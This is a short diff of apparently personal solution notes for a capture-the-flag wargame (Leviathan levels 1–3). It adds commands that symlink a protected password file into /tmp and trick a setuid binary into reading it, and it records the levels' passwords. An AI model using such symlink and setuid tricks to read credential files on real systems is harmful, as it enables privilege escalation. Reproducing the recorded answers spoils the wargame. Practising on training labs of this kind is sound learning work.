@@ -4,12 +4,15 @@ less .backup/bookmarks.html
 
 #1
 ltrace ./check
-# Use pwd givent to get shell access as leviathan2
+# Use pwd given to get shell access as leviathan2
 cat /etc/leviathan_pass/leviathan2
 #pwd: rioGegei8m
 
 #2
-
+mkdir /tmp/snoopy2
+cd /tmp/snoopy2
+ln -sfn /etc/leviathan_pass/leviathan3 l3
+~/println "l3 file"
 #pwd: ougahZi8Ta
 
 #3
